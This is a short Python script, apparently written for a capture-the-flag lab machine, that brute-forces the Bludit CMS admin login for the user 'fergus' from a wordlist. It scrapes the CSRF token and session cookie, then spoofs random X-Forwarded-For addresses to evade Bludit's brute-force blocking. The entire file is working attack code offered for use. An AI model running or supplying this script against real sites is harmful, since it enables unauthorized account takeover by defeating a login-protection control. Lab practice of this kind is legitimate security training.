import requests
import re
import random

#Usage: python3 bludit.py

HOST = '10.10.10.191'
USER = 'fergus'
PROXY = {'http':'127.0.0.1:8080'}

def init_session():
    # Return CSRF + Session Cookie
    r = requests.get('http://10.10.10.191/admin')
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"',r.text)
    csrf = csrf.group(1)
    cookie = r.cookies.get('BLUDIT-KEY')
    return csrf,cookie

def login(user,password):
    csrf, cookie = init_session()
    # When you post a request, you send below data: (confirm in burpsuite)
    # tokenCSRF=cec91863018879abb335c7d84ae4e22fb1126f8f&username=admin&password=admin&save=
    data = {
            'tokenCSRF':csrf,
            'username':user,
            'password':password,
            'save':''}
    #Adding X-Forwarded-For header to bypass bludit brute force mitigation
    headers = {
            'X-Forwarded-For': f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
            }
    #Adding cookie
    cookies = {
            'BLUDIT-KEY':cookie
            }
    #If you want to work with BurpSuite, edit 'r' as below
    # r = requests.post('http://10.10.10.191/admin/login',data=data,cookies=cookies,proxies=PROXY)
    r = requests.post('http://10.10.10.191/admin/login',data=data,cookies=cookies,headers=headers,allow_redirects=False)
    if r.status_code != 200:
        print("Status code",r.status_code)
        print(f"{USER}:{password}")
    elif "password incorrect" in r.text:
        return False
    elif "has been blocked" in r.text:
        print('BLOCKED')
        return False
    else:
        print(f"{USER}:{password}")
        return True

wl = open('words').readlines()
for line in wl:
    line = line.strip()
    login('fergus',line)

#login('asd','password')
#print( init_session() )